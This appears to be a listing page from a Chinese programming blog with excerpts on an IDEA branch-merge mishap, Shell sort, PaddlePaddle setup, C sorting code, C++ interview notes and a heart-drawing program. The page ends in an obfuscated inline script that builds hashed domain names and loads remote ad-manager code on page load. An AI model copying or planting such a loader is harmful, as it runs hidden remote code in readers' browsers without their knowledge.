当时觉得没什么问题，后面发现，弹出这个提示的时候，内存里面还是B分支的内容，再加上我删除语句的内容。
B分支和A分支的区别就是B分支修改了一个方法名，然后删除了一个方法。
当我点击完Keep Memory Changes按钮时，此时本地修改就是我删除了一个我想删除的语句，然后修改了一个方法名，删除了一个方法，这些变更在我push的时候推送到了远程，相当于我在这个文件上把分支B的内容合并到分支A。
原因 IDEA弹出文件缓存冲突的弹框原因是：外部进程更改了文件，并在IntelliJ IDEA中打开和未保存文件，这导致文件的两个版本冲突。IDEA文档中是这样描述的https://jetbrains.com.zh.xy2401.com/help/idea/file-cache-conflict.html
在切换分支后，应该是IDEA太卡，分支内容还没来的及切换，我就删除了那个语句，IDEA认为此时文件的文件内容（B分支文件内容再加上我删除语句）就是我修改后的内容，这时候切换分支显示分之后的文件反应过来，发现文件有冲突，提示冲突，我选择Keep Memory Changes，于是就出现B分支内容被合并到A分支上。
总结与启示 发现这个错误时后背发凉，辛亏发现得早，不然就是一个生产事故，如果当时选择Load File System Changes那么我删除的那个语句就会被覆盖掉。正确做法就是查看不同的地方，选择性保留，就像和分支一样，保留最终版本。所以遇到代码的问题一定要弄清原因，删代码一定要慎重、慎重、慎重。
特此记录，时刻谨记！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ec03b403ccae3a35b7752fb451a0a030/" rel="bookmark">
			排序算法——希尔排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
🛴基本介绍
算法思想
🛹实例
思路分析
代码实现
🛵算法性能分析
🛴基本介绍 希尔排序也是一种插入排序，它是简单插入排序经过改进之后的一个更高效的版本，也称为见效增量排序。
希尔排序的时间复杂度比直接插入排序的时间复杂度小，他与直接插入排序的不同在于它会优先比较距离较远的元素。
算法思想 希尔排序是按照一定的增量进行分组排序，对每组使用直接插入排序算法排序;随着分组个数的减少，每组中元素就会越来越多，当增量减少为1时，排序结束。
🛹实例 原始数组：[8,9,1,7,2,3,5,4,6,0]
分组的个数与数据个数有关。一般情况下，选择增量为gap=length/2
分组的个数一般为奇数个，因为偶数组会存在重复排序，所以分组个数为奇数组
思路分析 第一趟排序：初始增量gap=length/2=5，即将整个数组分为五组，对这五组分别进行直接插入排序
第二趟排序：然后缩小增量，gap=5/2=2，数组被分为两组，对这两组分别进行直接插入排序
第三趟排序：
再缩小增量为gap=2/2=1，此时整个数组为1组，进行直接插入排序，结果如下：
代码实现 public class ShellSort { public static void main(String[] args) { int []arr={8,9,1,7,2,3,5,4,6,0}; shellSort(arr); System.out.println("排序后的数组为："+Arrays.toString(arr)); } private static void shell(int[]arr,int gap){ if (arr==null||arr.length==1){ return; } //从第二个元素开始，和前面的有序表进行比较 for (int i=1;i&lt;arr.length;i++){ int temp=arr[i]; int j=i-gap; for (;j&gt;=0;j-=gap){ if (arr[j]&gt;temp){ arr[j+gap]=arr[j];//后移一个位置 } else { break; } } arr[j+gap]=temp; } } public static void shellSort(int []arr) { int[] gaps = {5, 3, 1}; for (int i = 0; i &lt; gaps.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ec03b403ccae3a35b7752fb451a0a030/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/97bd7de4ae5fe0bcdabdcdb9c681d191/" rel="bookmark">
			【paddleGAN学习笔记】PaddlePaddle框架
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 PaddlePaddle简介PaddlePaddle GPU版本安装使用PaddlePaddle做线性回归使用paddlepaddle解决MNIST问题Step1:准备数据Step2:配置网络Step3:模型训练Step4:模型评估Step5:模型预测 参考 PaddlePaddle简介 PaddlePaddle（飞浆）是百度开发的国产深度学习框架。用PaddlePaddle的好处是可以用AI Studio平台提供的GPU算力进行模型训练，不仅节约时间而且还是免费的。PaddlePaddle也提供了像PaddleSeg等一些套件，对于新手上手深度学习模型的项目很友好。 PaddlePaddle GPU版本安装 Step1：创建虚拟环境
conda create -n paddle_gpu python=3.7 Step2：进入创建的环境。
activate paddle_gpu
Step3：安装paddlepaddle（GPU版本），CUDA10.1以及与之配套的cuDNN。
conda install paddlepaddle-gpu==2.2.2 cudatoolkit=10.1 --channel https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/Paddle/
出现“done”，说明安装完成。
（CPU版）“conda install paddlepaddle==2.2.2 --channel https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/Paddle/”
Step4：测试是否安装成功。
依次输入python，import paddle，paddle.utils.run_check()
使用PaddlePaddle做线性回归 ① 引入库
import paddle import numpy as np paddle.__version__ ‘2.2.2’
② 定义训练和测试数据
# 定义训练和测试数据 x_data = np.array([[1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0], [2.0, 0.0, 0.0, 0.0, 0.0, 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/97bd7de4ae5fe0bcdabdcdb9c681d191/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b607f904ce8b12ac3511f5cee09ed93f/" rel="bookmark">
			输入学生学号、成绩，并排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		输入学生信息，包括学号、成绩，学号为整形，成绩为浮点型,当输入学号为-1则结束信息输入。当重复输入学生学号和成绩，取最高的成绩，并将学生信息按成绩由高到低排序。
引用头文件：
#include&lt;stdio.h&gt; #include&lt;string.h&gt; 定义结构体:
struct st { int num;//学号 float n;//成绩 }student[50]; 全局变量：
int j=0;//输入次数 int z=0;//输入学号相同次数 学生信息输入（成绩较低的一次致零）：
void ac1(struct st student[10]) { int i; int k,n; for(i=0;;i++) { scanf("%d",&amp;student[i].num); if(student[i].num==-1)break; scanf("%f\n",&amp;student[i].n); j++; } for(k=0;k&lt;j;k++) { for(n=k+1;n&lt;=j;n++) { if(student[n].num==student[k].num)//学号相同 if(student[n].n&gt;=student[k].n)//成绩大于等于 { student[k].n=student[n].n; student[n].n=0; z++; } else //成绩小于 { student[n].n=0; z++; } } } } 成绩排序（由高到低）：
void ac2(struct st student[10]) { int k,n; struct st a;//中间结构体变量 for(k=0;k&lt;j;k++)//排序 { for(n=0;n&lt;j;n++) { if(student[n].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b607f904ce8b12ac3511f5cee09ed93f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d36b78bcec9e64d5d6dc83d418481463/" rel="bookmark">
			C/C&#43;&#43;面试笔试知识点总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C/C++面试笔试知识点总结 1、const关键字的作用？(变量，参数，返回值)2、什么是死锁？3、造成死锁的4个必要条件？4、如何避免死锁？5、static关键字作用？6、c/c++中内存可以划分为几个部分？7、new 和 malloc的区别？8、计算机内部如何存储浮点数？9、什么是虚函数？10、什么是纯虚函数？11、什么是抽象类？12、vector和list的区别？13、空类创建时会自带哪些函数？14、指针和引用的区别？15、gcc程序编译过程？16、什么是内存泄漏？采用哪些方法来避免和减少这类错误？17、结构体对齐问题18、重载overload，覆盖override，隐藏overwrite，这三者之间的区别19、c++代码如何调用c语言代码？20、什么是野指针？21、栈溢出的原因以及解决方法？22、宏和内联函数的区别？23、类的静态成员变量和静态成员函数各有哪些特性？24、指针数组和数组指针的区别？25、虚函数表26、什么是多态？27、C++的四种强制转换28、sizeof 和 strlen 的区别？29、单链表反转30、进程和线程的区别？31、TCP/IP网络模型32、tcp协议33、udp协议34、tcp协议udp协议区别？35、进程间的通信方式36、技术面试基础知识总结（强烈推荐）37、C++ 中 struct 和 class区别？38、TCP 黏包问题39、socket中TCP的三次握手？40、socket的基本操作41、子类析构时要调用父类的析构函数吗？42、int id[sizeof(unsigned long)];这个对吗？为什么？43、typedef 和 define 有什么区别44、为什么free()释放内存的时候不需要指定内存的大小？45、STL常用标准库容器46、信号与槽的优缺点？47、说说C++智能指针？48、http和https有什么区别？48、单核cpu多线程有必要吗？49、关于*P++的问题 1、const关键字的作用？(变量，参数，返回值) 1）欲阻止一个变量被改变，可使用const，在定义该const变量时，需先初始化，以后就没有机会改变他了；
2）对指针而言，可以指定指针本身为const，也可以指定指针所指的数据为const，或二者同时指定为const；
3）在一个函数声明中，const可以修饰形参表明他是一个输入参数，在函数内部不可以改变其值；
4）对于类的成员函数，有时候必须指定其为const类型，表明其是一个常函数，不能修改类的成员变量；
5）对于类的成员函数，有时候必须指定其返回值为const类型，以使得其返回值不为“左值”。
2、什么是死锁？ 死锁就是线程1占有资源A去访问资源B，线程2占有资源B去访问资源A,这样就造成俩个线程谁也访问不到需要的资源
3、造成死锁的4个必要条件？ （1）互斥，同一时间统一资源只能由一个线程访问
（2）不可剥夺，当一个线程占有某资源时，只有该线程主动放弃该资源，外力无法解除
（3）请求和保持，线程1在占有某资源A的时候还可以请求资源B（吃着碗里看着锅里）
（4）回环，线程1占有资源A去请求资源B，线程2占有资源B去请求资源C,线程3占有资源C去请求资 源A
4、如何避免死锁？ （1）共有资源尽可能简短
（2）线程死锁等待超时则自动放弃请求并且释放自己占有的资源
（3）顺序加锁
5、static关键字作用？ （1）static修饰局部变量，局部变量的生命周期变长，函数执行结束不会立即释放内存
（2）static修饰全局变量，则该变量作用域变小，只能在当前文件使用，其它文件禁止用
（3）static修饰函数，函数作用域变小，只能在当前文件使用
（4）类的静态成员函数属于类，而不属于类的对象
6、c/c++中内存可以划分为几个部分？ （1）堆区 （例如malloc动态分配内存）
（2）栈区（局部变量）
（3）全局区（全局变量和静态变量）
（4）常量区
（5）程序代码区
7、new 和 malloc的区别？ （1）属性不一样，new是c++运算符，编译器支持就可以，而malloc是库函数，需要添加头文件才可以调用
（2）参数不一样，malloc分配内存的时候需要指定内存大小，而new根据类型自动计算所需空间大小
（3）返回值不一样,new返回的是对象类型的指针，而malloc返回的是void *的指针，需要强制类型转换
（4）new失败会抛出异常，malloc失败会返回NULL；
（5）new开辟的空间在自由存储区，malloc开辟的空间在堆区
（6）new的过程是先调用malloc开辟空间，之后在调用构造函数初始化成员变量。malloc没有初始化过程。delete是先调用析构函数，再调用free释放内存
8、计算机内部如何存储浮点数？ 浮点数在存储中都分为三个部分：
（1）符号位(Sign) : 0代表正，1代表为负
（2）指数位（Exponent）:用于存储科学计数法中的指数数据，并且采用移位存储（加127）
（3）尾数部分（Mantissa）：尾数部分
下面以float类型的数据8.25举例分析
8.25 = 1000.01 = 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d36b78bcec9e64d5d6dc83d418481463/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ba7d30e1512d0136cb6e6fbb877fc28/" rel="bookmark">
			用C语言编写爱心--表白
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		明天就是5月20号了，下面给大家编写一个简单的爱心代码，供大家参考，希望对大家有帮助！
#include&lt;stdio.h&gt; #include&lt;windows.h&gt; int main() { float x,y,a; for(y=1.5;y&gt;-1.5;y-=0.1) { for(x=-1.5;x&lt;1.5;x+=0.05) { a=x*x+y*y-1; putchar(a*a*a-x*x*y*y*y&lt;=0.0?'*':' '); } system("color 04"); putchar('\n'); } scanf("%f"); } 好了，小伙伴们拿去吧！
程序运行如下为：
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/268/">«</a>
	<span class="pagination__item pagination__item--current">269/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/270/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>